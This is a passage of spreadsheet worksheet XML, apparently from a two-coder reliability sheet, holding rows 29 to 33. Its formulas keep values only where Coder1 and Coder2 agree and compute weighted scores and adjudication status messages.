      <c r="A29" s="11">
        <f>Coder1!A29</f>
        <v/>
      </c>
      <c r="B29" s="11">
        <f>Coder1!B29</f>
        <v/>
      </c>
      <c r="C29" s="11">
        <f>Coder1!C29</f>
        <v/>
      </c>
      <c r="D29" s="11">
        <f>Coder1!D29</f>
        <v/>
      </c>
      <c r="E29" s="14">
        <f>IF(AND(Coder1!E29&amp;""&lt;&gt;"",Coder1!E29&amp;""=Coder2!E29&amp;""),Coder1!E29,"")</f>
        <v/>
      </c>
      <c r="F29" s="14">
        <f>IF(AND(Coder1!F29&amp;""&lt;&gt;"",Coder1!F29&amp;""=Coder2!F29&amp;""),Coder1!F29,"")</f>
        <v/>
      </c>
      <c r="G29" s="14">
        <f>IF(AND(Coder1!G29&amp;""&lt;&gt;"",Coder1!G29&amp;""=Coder2!G29&amp;""),Coder1!G29,"")</f>
        <v/>
      </c>
      <c r="H29" s="14">
        <f>IF(AND(Coder1!H29&amp;""&lt;&gt;"",Coder1!H29&amp;""=Coder2!H29&amp;""),Coder1!H29,"")</f>
        <v/>
      </c>
      <c r="I29" s="14">
        <f>IF(AND(Coder1!I29&amp;""&lt;&gt;"",Coder1!I29&amp;""=Coder2!I29&amp;""),Coder1!I29,"")</f>
        <v/>
      </c>
      <c r="J29" s="14">
        <f>IF(AND(Coder1!J29&amp;""&lt;&gt;"",Coder1!J29&amp;""=Coder2!J29&amp;""),Coder1!J29,"")</f>
        <v/>
      </c>
      <c r="K29" s="14">
        <f>IF(AND(Coder1!K29&amp;""&lt;&gt;"",Coder1!K29&amp;""=Coder2!K29&amp;""),Coder1!K29,"")</f>
        <v/>
      </c>
      <c r="L29" s="14">
        <f>IF(AND(Coder1!L29&amp;""&lt;&gt;"",Coder1!L29&amp;""=Coder2!L29&amp;""),Coder1!L29,"")</f>
        <v/>
      </c>
      <c r="M29" s="14">
        <f>IF(AND(Coder1!M29&amp;""&lt;&gt;"",Coder1!M29&amp;""=Coder2!M29&amp;""),Coder1!M29,"")</f>
        <v/>
      </c>
      <c r="N29" s="14">
        <f>IF(AND(Coder1!N29&amp;""&lt;&gt;"",Coder1!N29&amp;""=Coder2!N29&amp;""),Coder1!N29,"")</f>
        <v/>
      </c>
      <c r="O29" s="14">
        <f>IF(AND(Coder1!O29&amp;""&lt;&gt;"",Coder1!O29&amp;""=Coder2!O29&amp;""),Coder1!O29,"")</f>
        <v/>
      </c>
      <c r="P29" s="14">
        <f>IF(AND(Coder1!P29&amp;""&lt;&gt;"",Coder1!P29&amp;""=Coder2!P29&amp;""),Coder1!P29,"")</f>
        <v/>
      </c>
      <c r="Q29" s="14">
        <f>IF(AND(Coder1!Q29&amp;""&lt;&gt;"",Coder1!Q29&amp;""=Coder2!Q29&amp;""),Coder1!Q29,"")</f>
        <v/>
      </c>
      <c r="R29" s="14">
        <f>IF(AND(Coder1!R29&amp;""&lt;&gt;"",Coder1!R29&amp;""=Coder2!R29&amp;""),Coder1!R29,"")</f>
        <v/>
      </c>
      <c r="S29" s="14">
        <f>IF(AND(Coder1!S29&amp;""&lt;&gt;"",Coder1!S29&amp;""=Coder2!S29&amp;""),Coder1!S29,"")</f>
        <v/>
      </c>
      <c r="T29" s="14">
        <f>IF(AND(Coder1!T29&amp;""&lt;&gt;"",Coder1!T29&amp;""=Coder2!T29&amp;""),Coder1!T29,"")</f>
        <v/>
      </c>
      <c r="U29" s="14">
        <f>IF(AND(Coder1!U29&amp;""&lt;&gt;"",Coder1!U29&amp;""=Coder2!U29&amp;""),Coder1!U29,"")</f>
        <v/>
      </c>
      <c r="V29" s="14">
        <f>IF(AND(Coder1!V29&amp;""&lt;&gt;"",Coder1!V29&amp;""=Coder2!V29&amp;""),Coder1!V29,"")</f>
        <v/>
      </c>
      <c r="W29" s="14">
        <f>IF(AND(Coder1!W29&amp;""&lt;&gt;"",Coder1!W29&amp;""=Coder2!W29&amp;""),Coder1!W29,"")</f>
        <v/>
      </c>
      <c r="X29" s="14">
        <f>IF(AND(Coder1!X29&amp;""&lt;&gt;"",Coder1!X29&amp;""=Coder2!X29&amp;""),Coder1!X29,"")</f>
        <v/>
      </c>
      <c r="Y29" s="14">
        <f>IF(AND(Coder1!Y29&amp;""&lt;&gt;"",Coder1!Y29&amp;""=Coder2!Y29&amp;""),Coder1!Y29,"")</f>
        <v/>
      </c>
      <c r="Z29" s="14">
        <f>IF(AND(Coder1!Z29&amp;""&lt;&gt;"",Coder1!Z29&amp;""=Coder2!Z29&amp;""),Coder1!Z29,"")</f>
        <v/>
      </c>
      <c r="AA29" s="14">
        <f>IF(AND(Coder1!AA29&amp;""&lt;&gt;"",Coder1!AA29&amp;""=Coder2!AA29&amp;""),Coder1!AA29,"")</f>
        <v/>
      </c>
      <c r="AB29" s="14">
        <f>IF(AND(Coder1!AB29&amp;""&lt;&gt;"",Coder1!AB29&amp;""=Coder2!AB29&amp;""),Coder1!AB29,"")</f>
        <v/>
      </c>
      <c r="AC29" s="14">
        <f>IF(AND(Coder1!AC29&amp;""&lt;&gt;"",Coder1!AC29&amp;""=Coder2!AC29&amp;""),Coder1!AC29,"")</f>
        <v/>
      </c>
      <c r="AD29" s="14">
        <f>IF(AND(Coder1!AD29&amp;""&lt;&gt;"",Coder1!AD29&amp;""=Coder2!AD29&amp;""),Coder1!AD29,"")</f>
        <v/>
      </c>
      <c r="AE29" s="14">
        <f>IF(AND(Coder1!AE29&amp;""&lt;&gt;"",Coder1!AE29&amp;""=Coder2!AE29&amp;""),Coder1!AE29,"")</f>
        <v/>
      </c>
      <c r="AF29" s="14">
        <f>IF(AND(Coder1!AF29&amp;""&lt;&gt;"",Coder1!AF29&amp;""=Coder2!AF29&amp;""),Coder1!AF29,"")</f>
        <v/>
      </c>
      <c r="AG29" s="14">
        <f>IF(AND(Coder1!AG29&amp;""&lt;&gt;"",Coder1!AG29&amp;""=Coder2!AG29&amp;""),Coder1!AG29,"")</f>
        <v/>
      </c>
      <c r="AH29" s="14">
        <f>IF(AND(Coder1!AH29&amp;""&lt;&gt;"",Coder1!AH29&amp;""=Coder2!AH29&amp;""),Coder1!AH29,"")</f>
        <v/>
      </c>
      <c r="AI29" s="11">
        <f>IF(COUNT(E29:L29)=0,"",SUM(E29:L29))</f>
        <v/>
      </c>
      <c r="AJ29" s="11">
        <f>IF(AI29="","",N(E29)*3+N(F29)*2+N(G29)*2+N(H29)*2+N(I29)*2+N(J29)*3+N(K29)*3+N(L29)*3)</f>
        <v/>
      </c>
      <c r="AK29" s="11">
        <f>IF(AI29="","",COUNTIF(N29:AG29,1))</f>
        <v/>
      </c>
      <c r="AL29" s="11">
        <f>IF(OR(AJ29="",AJ29=0),"",ROUND(100*(AJ29-AK29)/AJ29,1))</f>
        <v/>
      </c>
      <c r="AM29" s="11">
        <f>IF(AND(Coder1!AN29=1,Coder2!AN29=1),IF(COUNTBLANK(E29:AH29)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN29" s="11">
        <f>IF(AND(Coder1!AN29=1,Coder2!AN29=1),IF(SUMPRODUCT(--(Coder1!E29:AH29&amp;""&lt;&gt;Coder2!E29:AH29&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO29" s="11" t="n"/>
    </row>
    <row r="30">
      <c r="A30" s="11">
        <f>Coder1!A30</f>
        <v/>
      </c>
      <c r="B30" s="11">
        <f>Coder1!B30</f>
        <v/>
      </c>
      <c r="C30" s="11">
        <f>Coder1!C30</f>
        <v/>
      </c>
      <c r="D30" s="11">
        <f>Coder1!D30</f>
        <v/>
      </c>
      <c r="E30" s="14">
        <f>IF(AND(Coder1!E30&amp;""&lt;&gt;"",Coder1!E30&amp;""=Coder2!E30&amp;""),Coder1!E30,"")</f>
        <v/>
      </c>
      <c r="F30" s="14">
        <f>IF(AND(Coder1!F30&amp;""&lt;&gt;"",Coder1!F30&amp;""=Coder2!F30&amp;""),Coder1!F30,"")</f>
        <v/>
      </c>
      <c r="G30" s="14">
        <f>IF(AND(Coder1!G30&amp;""&lt;&gt;"",Coder1!G30&amp;""=Coder2!G30&amp;""),Coder1!G30,"")</f>
        <v/>
      </c>
      <c r="H30" s="14">
        <f>IF(AND(Coder1!H30&amp;""&lt;&gt;"",Coder1!H30&amp;""=Coder2!H30&amp;""),Coder1!H30,"")</f>
        <v/>
      </c>
      <c r="I30" s="14">
        <f>IF(AND(Coder1!I30&amp;""&lt;&gt;"",Coder1!I30&amp;""=Coder2!I30&amp;""),Coder1!I30,"")</f>
        <v/>
      </c>
      <c r="J30" s="14">
        <f>IF(AND(Coder1!J30&amp;""&lt;&gt;"",Coder1!J30&amp;""=Coder2!J30&amp;""),Coder1!J30,"")</f>
        <v/>
      </c>
      <c r="K30" s="14">
        <f>IF(AND(Coder1!K30&amp;""&lt;&gt;"",Coder1!K30&amp;""=Coder2!K30&amp;""),Coder1!K30,"")</f>
        <v/>
      </c>
      <c r="L30" s="14">
        <f>IF(AND(Coder1!L30&amp;""&lt;&gt;"",Coder1!L30&amp;""=Coder2!L30&amp;""),Coder1!L30,"")</f>
        <v/>
      </c>
      <c r="M30" s="14">
        <f>IF(AND(Coder1!M30&amp;""&lt;&gt;"",Coder1!M30&amp;""=Coder2!M30&amp;""),Coder1!M30,"")</f>
        <v/>
      </c>
      <c r="N30" s="14">
        <f>IF(AND(Coder1!N30&amp;""&lt;&gt;"",Coder1!N30&amp;""=Coder2!N30&amp;""),Coder1!N30,"")</f>
        <v/>
      </c>
      <c r="O30" s="14">
        <f>IF(AND(Coder1!O30&amp;""&lt;&gt;"",Coder1!O30&amp;""=Coder2!O30&amp;""),Coder1!O30,"")</f>
        <v/>
      </c>
      <c r="P30" s="14">
        <f>IF(AND(Coder1!P30&amp;""&lt;&gt;"",Coder1!P30&amp;""=Coder2!P30&amp;""),Coder1!P30,"")</f>
        <v/>
      </c>
      <c r="Q30" s="14">
        <f>IF(AND(Coder1!Q30&amp;""&lt;&gt;"",Coder1!Q30&amp;""=Coder2!Q30&amp;""),Coder1!Q30,"")</f>
        <v/>
      </c>
      <c r="R30" s="14">
        <f>IF(AND(Coder1!R30&amp;""&lt;&gt;"",Coder1!R30&amp;""=Coder2!R30&amp;""),Coder1!R30,"")</f>
        <v/>
      </c>
      <c r="S30" s="14">
        <f>IF(AND(Coder1!S30&amp;""&lt;&gt;"",Coder1!S30&amp;""=Coder2!S30&amp;""),Coder1!S30,"")</f>
        <v/>
      </c>
      <c r="T30" s="14">
        <f>IF(AND(Coder1!T30&amp;""&lt;&gt;"",Coder1!T30&amp;""=Coder2!T30&amp;""),Coder1!T30,"")</f>
        <v/>
      </c>
      <c r="U30" s="14">
        <f>IF(AND(Coder1!U30&amp;""&lt;&gt;"",Coder1!U30&amp;""=Coder2!U30&amp;""),Coder1!U30,"")</f>
        <v/>
      </c>
      <c r="V30" s="14">
        <f>IF(AND(Coder1!V30&amp;""&lt;&gt;"",Coder1!V30&amp;""=Coder2!V30&amp;""),Coder1!V30,"")</f>
        <v/>
      </c>
      <c r="W30" s="14">
        <f>IF(AND(Coder1!W30&amp;""&lt;&gt;"",Coder1!W30&amp;""=Coder2!W30&amp;""),Coder1!W30,"")</f>
        <v/>
      </c>
      <c r="X30" s="14">
        <f>IF(AND(Coder1!X30&amp;""&lt;&gt;"",Coder1!X30&amp;""=Coder2!X30&amp;""),Coder1!X30,"")</f>
        <v/>
      </c>
      <c r="Y30" s="14">
        <f>IF(AND(Coder1!Y30&amp;""&lt;&gt;"",Coder1!Y30&amp;""=Coder2!Y30&amp;""),Coder1!Y30,"")</f>
        <v/>
      </c>
      <c r="Z30" s="14">
        <f>IF(AND(Coder1!Z30&amp;""&lt;&gt;"",Coder1!Z30&amp;""=Coder2!Z30&amp;""),Coder1!Z30,"")</f>
        <v/>
      </c>
      <c r="AA30" s="14">
        <f>IF(AND(Coder1!AA30&amp;""&lt;&gt;"",Coder1!AA30&amp;""=Coder2!AA30&amp;""),Coder1!AA30,"")</f>
        <v/>
      </c>
      <c r="AB30" s="14">
        <f>IF(AND(Coder1!AB30&amp;""&lt;&gt;"",Coder1!AB30&amp;""=Coder2!AB30&amp;""),Coder1!AB30,"")</f>
        <v/>
      </c>
      <c r="AC30" s="14">
        <f>IF(AND(Coder1!AC30&amp;""&lt;&gt;"",Coder1!AC30&amp;""=Coder2!AC30&amp;""),Coder1!AC30,"")</f>
        <v/>
      </c>
      <c r="AD30" s="14">
        <f>IF(AND(Coder1!AD30&amp;""&lt;&gt;"",Coder1!AD30&amp;""=Coder2!AD30&amp;""),Coder1!AD30,"")</f>
        <v/>
      </c>
      <c r="AE30" s="14">
        <f>IF(AND(Coder1!AE30&amp;""&lt;&gt;"",Coder1!AE30&amp;""=Coder2!AE30&amp;""),Coder1!AE30,"")</f>
        <v/>
      </c>
      <c r="AF30" s="14">
        <f>IF(AND(Coder1!AF30&amp;""&lt;&gt;"",Coder1!AF30&amp;""=Coder2!AF30&amp;""),Coder1!AF30,"")</f>
        <v/>
      </c>
      <c r="AG30" s="14">
        <f>IF(AND(Coder1!AG30&amp;""&lt;&gt;"",Coder1!AG30&amp;""=Coder2!AG30&amp;""),Coder1!AG30,"")</f>
        <v/>
      </c>
      <c r="AH30" s="14">
        <f>IF(AND(Coder1!AH30&amp;""&lt;&gt;"",Coder1!AH30&amp;""=Coder2!AH30&amp;""),Coder1!AH30,"")</f>
        <v/>
      </c>
      <c r="AI30" s="11">
        <f>IF(COUNT(E30:L30)=0,"",SUM(E30:L30))</f>
        <v/>
      </c>
      <c r="AJ30" s="11">
        <f>IF(AI30="","",N(E30)*3+N(F30)*2+N(G30)*2+N(H30)*2+N(I30)*2+N(J30)*3+N(K30)*3+N(L30)*3)</f>
        <v/>
      </c>
      <c r="AK30" s="11">
        <f>IF(AI30="","",COUNTIF(N30:AG30,1))</f>
        <v/>
      </c>
      <c r="AL30" s="11">
        <f>IF(OR(AJ30="",AJ30=0),"",ROUND(100*(AJ30-AK30)/AJ30,1))</f>
        <v/>
      </c>
      <c r="AM30" s="11">
        <f>IF(AND(Coder1!AN30=1,Coder2!AN30=1),IF(COUNTBLANK(E30:AH30)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN30" s="11">
        <f>IF(AND(Coder1!AN30=1,Coder2!AN30=1),IF(SUMPRODUCT(--(Coder1!E30:AH30&amp;""&lt;&gt;Coder2!E30:AH30&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO30" s="11" t="n"/>
    </row>
    <row r="31">
      <c r="A31" s="11">
        <f>Coder1!A31</f>
        <v/>
      </c>
      <c r="B31" s="11">
        <f>Coder1!B31</f>
        <v/>
      </c>
      <c r="C31" s="11">
        <f>Coder1!C31</f>
        <v/>
      </c>
      <c r="D31" s="11">
        <f>Coder1!D31</f>
        <v/>
      </c>
      <c r="E31" s="14">
        <f>IF(AND(Coder1!E31&amp;""&lt;&gt;"",Coder1!E31&amp;""=Coder2!E31&amp;""),Coder1!E31,"")</f>
        <v/>
      </c>
      <c r="F31" s="14">
        <f>IF(AND(Coder1!F31&amp;""&lt;&gt;"",Coder1!F31&amp;""=Coder2!F31&amp;""),Coder1!F31,"")</f>
        <v/>
      </c>
      <c r="G31" s="14">
        <f>IF(AND(Coder1!G31&amp;""&lt;&gt;"",Coder1!G31&amp;""=Coder2!G31&amp;""),Coder1!G31,"")</f>
        <v/>
      </c>
      <c r="H31" s="14">
        <f>IF(AND(Coder1!H31&amp;""&lt;&gt;"",Coder1!H31&amp;""=Coder2!H31&amp;""),Coder1!H31,"")</f>
        <v/>
      </c>
      <c r="I31" s="14">
        <f>IF(AND(Coder1!I31&amp;""&lt;&gt;"",Coder1!I31&amp;""=Coder2!I31&amp;""),Coder1!I31,"")</f>
        <v/>
      </c>
      <c r="J31" s="14">
        <f>IF(AND(Coder1!J31&amp;""&lt;&gt;"",Coder1!J31&amp;""=Coder2!J31&amp;""),Coder1!J31,"")</f>
        <v/>
      </c>
      <c r="K31" s="14">
        <f>IF(AND(Coder1!K31&amp;""&lt;&gt;"",Coder1!K31&amp;""=Coder2!K31&amp;""),Coder1!K31,"")</f>
        <v/>
      </c>
      <c r="L31" s="14">
        <f>IF(AND(Coder1!L31&amp;""&lt;&gt;"",Coder1!L31&amp;""=Coder2!L31&amp;""),Coder1!L31,"")</f>
        <v/>
      </c>
      <c r="M31" s="14">
        <f>IF(AND(Coder1!M31&amp;""&lt;&gt;"",Coder1!M31&amp;""=Coder2!M31&amp;""),Coder1!M31,"")</f>
        <v/>
      </c>
      <c r="N31" s="14">
        <f>IF(AND(Coder1!N31&amp;""&lt;&gt;"",Coder1!N31&amp;""=Coder2!N31&amp;""),Coder1!N31,"")</f>
        <v/>
      </c>
      <c r="O31" s="14">
        <f>IF(AND(Coder1!O31&amp;""&lt;&gt;"",Coder1!O31&amp;""=Coder2!O31&amp;""),Coder1!O31,"")</f>
        <v/>
      </c>
      <c r="P31" s="14">
        <f>IF(AND(Coder1!P31&amp;""&lt;&gt;"",Coder1!P31&amp;""=Coder2!P31&amp;""),Coder1!P31,"")</f>
        <v/>
      </c>
      <c r="Q31" s="14">
        <f>IF(AND(Coder1!Q31&amp;""&lt;&gt;"",Coder1!Q31&amp;""=Coder2!Q31&amp;""),Coder1!Q31,"")</f>
        <v/>
      </c>
      <c r="R31" s="14">
        <f>IF(AND(Coder1!R31&amp;""&lt;&gt;"",Coder1!R31&amp;""=Coder2!R31&amp;""),Coder1!R31,"")</f>
        <v/>
      </c>
      <c r="S31" s="14">
        <f>IF(AND(Coder1!S31&amp;""&lt;&gt;"",Coder1!S31&amp;""=Coder2!S31&amp;""),Coder1!S31,"")</f>
        <v/>
      </c>
      <c r="T31" s="14">
        <f>IF(AND(Coder1!T31&amp;""&lt;&gt;"",Coder1!T31&amp;""=Coder2!T31&amp;""),Coder1!T31,"")</f>
        <v/>
      </c>
      <c r="U31" s="14">
        <f>IF(AND(Coder1!U31&amp;""&lt;&gt;"",Coder1!U31&amp;""=Coder2!U31&amp;""),Coder1!U31,"")</f>
        <v/>
      </c>
      <c r="V31" s="14">
        <f>IF(AND(Coder1!V31&amp;""&lt;&gt;"",Coder1!V31&amp;""=Coder2!V31&amp;""),Coder1!V31,"")</f>
        <v/>
      </c>
      <c r="W31" s="14">
        <f>IF(AND(Coder1!W31&amp;""&lt;&gt;"",Coder1!W31&amp;""=Coder2!W31&amp;""),Coder1!W31,"")</f>
        <v/>
      </c>
      <c r="X31" s="14">
        <f>IF(AND(Coder1!X31&amp;""&lt;&gt;"",Coder1!X31&amp;""=Coder2!X31&amp;""),Coder1!X31,"")</f>
        <v/>
      </c>
      <c r="Y31" s="14">
        <f>IF(AND(Coder1!Y31&amp;""&lt;&gt;"",Coder1!Y31&amp;""=Coder2!Y31&amp;""),Coder1!Y31,"")</f>
        <v/>
      </c>
      <c r="Z31" s="14">
        <f>IF(AND(Coder1!Z31&amp;""&lt;&gt;"",Coder1!Z31&amp;""=Coder2!Z31&amp;""),Coder1!Z31,"")</f>
        <v/>
      </c>
      <c r="AA31" s="14">
        <f>IF(AND(Coder1!AA31&amp;""&lt;&gt;"",Coder1!AA31&amp;""=Coder2!AA31&amp;""),Coder1!AA31,"")</f>
        <v/>
      </c>
      <c r="AB31" s="14">
        <f>IF(AND(Coder1!AB31&amp;""&lt;&gt;"",Coder1!AB31&amp;""=Coder2!AB31&amp;""),Coder1!AB31,"")</f>
        <v/>
      </c>
      <c r="AC31" s="14">
        <f>IF(AND(Coder1!AC31&amp;""&lt;&gt;"",Coder1!AC31&amp;""=Coder2!AC31&amp;""),Coder1!AC31,"")</f>
        <v/>
      </c>
      <c r="AD31" s="14">
        <f>IF(AND(Coder1!AD31&amp;""&lt;&gt;"",Coder1!AD31&amp;""=Coder2!AD31&amp;""),Coder1!AD31,"")</f>
        <v/>
      </c>
      <c r="AE31" s="14">
        <f>IF(AND(Coder1!AE31&amp;""&lt;&gt;"",Coder1!AE31&amp;""=Coder2!AE31&amp;""),Coder1!AE31,"")</f>
        <v/>
      </c>
      <c r="AF31" s="14">
        <f>IF(AND(Coder1!AF31&amp;""&lt;&gt;"",Coder1!AF31&amp;""=Coder2!AF31&amp;""),Coder1!AF31,"")</f>
        <v/>
      </c>
      <c r="AG31" s="14">
        <f>IF(AND(Coder1!AG31&amp;""&lt;&gt;"",Coder1!AG31&amp;""=Coder2!AG31&amp;""),Coder1!AG31,"")</f>
        <v/>
      </c>
      <c r="AH31" s="14">
        <f>IF(AND(Coder1!AH31&amp;""&lt;&gt;"",Coder1!AH31&amp;""=Coder2!AH31&amp;""),Coder1!AH31,"")</f>
        <v/>
      </c>
      <c r="AI31" s="11">
        <f>IF(COUNT(E31:L31)=0,"",SUM(E31:L31))</f>
        <v/>
      </c>
      <c r="AJ31" s="11">
        <f>IF(AI31="","",N(E31)*3+N(F31)*2+N(G31)*2+N(H31)*2+N(I31)*2+N(J31)*3+N(K31)*3+N(L31)*3)</f>
        <v/>
      </c>
      <c r="AK31" s="11">
        <f>IF(AI31="","",COUNTIF(N31:AG31,1))</f>
        <v/>
      </c>
      <c r="AL31" s="11">
        <f>IF(OR(AJ31="",AJ31=0),"",ROUND(100*(AJ31-AK31)/AJ31,1))</f>
        <v/>
      </c>
      <c r="AM31" s="11">
        <f>IF(AND(Coder1!AN31=1,Coder2!AN31=1),IF(COUNTBLANK(E31:AH31)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN31" s="11">
        <f>IF(AND(Coder1!AN31=1,Coder2!AN31=1),IF(SUMPRODUCT(--(Coder1!E31:AH31&amp;""&lt;&gt;Coder2!E31:AH31&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO31" s="11" t="n"/>
    </row>
    <row r="32">
      <c r="A32" s="11">
        <f>Coder1!A32</f>
        <v/>
      </c>
      <c r="B32" s="11">
        <f>Coder1!B32</f>
        <v/>
      </c>
      <c r="C32" s="11">
        <f>Coder1!C32</f>
        <v/>
      </c>
      <c r="D32" s="11">
        <f>Coder1!D32</f>
        <v/>
      </c>
      <c r="E32" s="14">
        <f>IF(AND(Coder1!E32&amp;""&lt;&gt;"",Coder1!E32&amp;""=Coder2!E32&amp;""),Coder1!E32,"")</f>
        <v/>
      </c>
      <c r="F32" s="14">
        <f>IF(AND(Coder1!F32&amp;""&lt;&gt;"",Coder1!F32&amp;""=Coder2!F32&amp;""),Coder1!F32,"")</f>
        <v/>
      </c>
      <c r="G32" s="14">
        <f>IF(AND(Coder1!G32&amp;""&lt;&gt;"",Coder1!G32&amp;""=Coder2!G32&amp;""),Coder1!G32,"")</f>
        <v/>
      </c>
      <c r="H32" s="14">
        <f>IF(AND(Coder1!H32&amp;""&lt;&gt;"",Coder1!H32&amp;""=Coder2!H32&amp;""),Coder1!H32,"")</f>
        <v/>
      </c>
      <c r="I32" s="14">
        <f>IF(AND(Coder1!I32&amp;""&lt;&gt;"",Coder1!I32&amp;""=Coder2!I32&amp;""),Coder1!I32,"")</f>
        <v/>
      </c>
      <c r="J32" s="14">
        <f>IF(AND(Coder1!J32&amp;""&lt;&gt;"",Coder1!J32&amp;""=Coder2!J32&amp;""),Coder1!J32,"")</f>
        <v/>
      </c>
      <c r="K32" s="14">
        <f>IF(AND(Coder1!K32&amp;""&lt;&gt;"",Coder1!K32&amp;""=Coder2!K32&amp;""),Coder1!K32,"")</f>
        <v/>
      </c>
      <c r="L32" s="14">
        <f>IF(AND(Coder1!L32&amp;""&lt;&gt;"",Coder1!L32&amp;""=Coder2!L32&amp;""),Coder1!L32,"")</f>
        <v/>
      </c>
      <c r="M32" s="14">
        <f>IF(AND(Coder1!M32&amp;""&lt;&gt;"",Coder1!M32&amp;""=Coder2!M32&amp;""),Coder1!M32,"")</f>
        <v/>
      </c>
      <c r="N32" s="14">
        <f>IF(AND(Coder1!N32&amp;""&lt;&gt;"",Coder1!N32&amp;""=Coder2!N32&amp;""),Coder1!N32,"")</f>
        <v/>
      </c>
      <c r="O32" s="14">
        <f>IF(AND(Coder1!O32&amp;""&lt;&gt;"",Coder1!O32&amp;""=Coder2!O32&amp;""),Coder1!O32,"")</f>
        <v/>
      </c>
      <c r="P32" s="14">
        <f>IF(AND(Coder1!P32&amp;""&lt;&gt;"",Coder1!P32&amp;""=Coder2!P32&amp;""),Coder1!P32,"")</f>
        <v/>
      </c>
      <c r="Q32" s="14">
        <f>IF(AND(Coder1!Q32&amp;""&lt;&gt;"",Coder1!Q32&amp;""=Coder2!Q32&amp;""),Coder1!Q32,"")</f>
        <v/>
      </c>
      <c r="R32" s="14">
        <f>IF(AND(Coder1!R32&amp;""&lt;&gt;"",Coder1!R32&amp;""=Coder2!R32&amp;""),Coder1!R32,"")</f>
        <v/>
      </c>
      <c r="S32" s="14">
        <f>IF(AND(Coder1!S32&amp;""&lt;&gt;"",Coder1!S32&amp;""=Coder2!S32&amp;""),Coder1!S32,"")</f>
        <v/>
      </c>
      <c r="T32" s="14">
        <f>IF(AND(Coder1!T32&amp;""&lt;&gt;"",Coder1!T32&amp;""=Coder2!T32&amp;""),Coder1!T32,"")</f>
        <v/>
      </c>
      <c r="U32" s="14">
        <f>IF(AND(Coder1!U32&amp;""&lt;&gt;"",Coder1!U32&amp;""=Coder2!U32&amp;""),Coder1!U32,"")</f>
        <v/>
      </c>
      <c r="V32" s="14">
        <f>IF(AND(Coder1!V32&amp;""&lt;&gt;"",Coder1!V32&amp;""=Coder2!V32&amp;""),Coder1!V32,"")</f>
        <v/>
      </c>
      <c r="W32" s="14">
        <f>IF(AND(Coder1!W32&amp;""&lt;&gt;"",Coder1!W32&amp;""=Coder2!W32&amp;""),Coder1!W32,"")</f>
        <v/>
      </c>
      <c r="X32" s="14">
        <f>IF(AND(Coder1!X32&amp;""&lt;&gt;"",Coder1!X32&amp;""=Coder2!X32&amp;""),Coder1!X32,"")</f>
        <v/>
      </c>
      <c r="Y32" s="14">
        <f>IF(AND(Coder1!Y32&amp;""&lt;&gt;"",Coder1!Y32&amp;""=Coder2!Y32&amp;""),Coder1!Y32,"")</f>
        <v/>
      </c>
      <c r="Z32" s="14">
        <f>IF(AND(Coder1!Z32&amp;""&lt;&gt;"",Coder1!Z32&amp;""=Coder2!Z32&amp;""),Coder1!Z32,"")</f>
        <v/>
      </c>
      <c r="AA32" s="14">
        <f>IF(AND(Coder1!AA32&amp;""&lt;&gt;"",Coder1!AA32&amp;""=Coder2!AA32&amp;""),Coder1!AA32,"")</f>
        <v/>
      </c>
      <c r="AB32" s="14">
        <f>IF(AND(Coder1!AB32&amp;""&lt;&gt;"",Coder1!AB32&amp;""=Coder2!AB32&amp;""),Coder1!AB32,"")</f>
        <v/>
      </c>
      <c r="AC32" s="14">
        <f>IF(AND(Coder1!AC32&amp;""&lt;&gt;"",Coder1!AC32&amp;""=Coder2!AC32&amp;""),Coder1!AC32,"")</f>
        <v/>
      </c>
      <c r="AD32" s="14">
        <f>IF(AND(Coder1!AD32&amp;""&lt;&gt;"",Coder1!AD32&amp;""=Coder2!AD32&amp;""),Coder1!AD32,"")</f>
        <v/>
      </c>
      <c r="AE32" s="14">
        <f>IF(AND(Coder1!AE32&amp;""&lt;&gt;"",Coder1!AE32&amp;""=Coder2!AE32&amp;""),Coder1!AE32,"")</f>
        <v/>
      </c>
      <c r="AF32" s="14">
        <f>IF(AND(Coder1!AF32&amp;""&lt;&gt;"",Coder1!AF32&amp;""=Coder2!AF32&amp;""),Coder1!AF32,"")</f>
        <v/>
      </c>
      <c r="AG32" s="14">
        <f>IF(AND(Coder1!AG32&amp;""&lt;&gt;"",Coder1!AG32&amp;""=Coder2!AG32&amp;""),Coder1!AG32,"")</f>
        <v/>
      </c>
      <c r="AH32" s="14">
        <f>IF(AND(Coder1!AH32&amp;""&lt;&gt;"",Coder1!AH32&amp;""=Coder2!AH32&amp;""),Coder1!AH32,"")</f>
        <v/>
      </c>
      <c r="AI32" s="11">
        <f>IF(COUNT(E32:L32)=0,"",SUM(E32:L32))</f>
        <v/>
      </c>
      <c r="AJ32" s="11">
        <f>IF(AI32="","",N(E32)*3+N(F32)*2+N(G32)*2+N(H32)*2+N(I32)*2+N(J32)*3+N(K32)*3+N(L32)*3)</f>
        <v/>
      </c>
      <c r="AK32" s="11">
        <f>IF(AI32="","",COUNTIF(N32:AG32,1))</f>
        <v/>
      </c>
      <c r="AL32" s="11">
        <f>IF(OR(AJ32="",AJ32=0),"",ROUND(100*(AJ32-AK32)/AJ32,1))</f>
        <v/>
      </c>
      <c r="AM32" s="11">
        <f>IF(AND(Coder1!AN32=1,Coder2!AN32=1),IF(COUNTBLANK(E32:AH32)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN32" s="11">
        <f>IF(AND(Coder1!AN32=1,Coder2!AN32=1),IF(SUMPRODUCT(--(Coder1!E32:AH32&amp;""&lt;&gt;Coder2!E32:AH32&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO32" s="11" t="n"/>
    </row>
    <row r="33">
      <c r="A33" s="11">
        <f>Coder1!A33</f>
        <v/>
      </c>
      <c r="B33" s="11">
        <f>Coder1!B33</f>
        <v/>
      </c>
      <c r="C33" s="11">
        <f>Coder1!C33</f>
        <v/>
      </c>
      <c r="D33" s="11">
        <f>Coder1!D33</f>
        <v/>
      </c>
      <c r="E33" s="14">
        <f>IF(AND(Coder1!E33&amp;""&lt;&gt;"",Coder1!E33&amp;""=Coder2!E33&amp;""),Coder1!E33,"")</f>
        <v/>
      </c>
      <c r="F33" s="14">
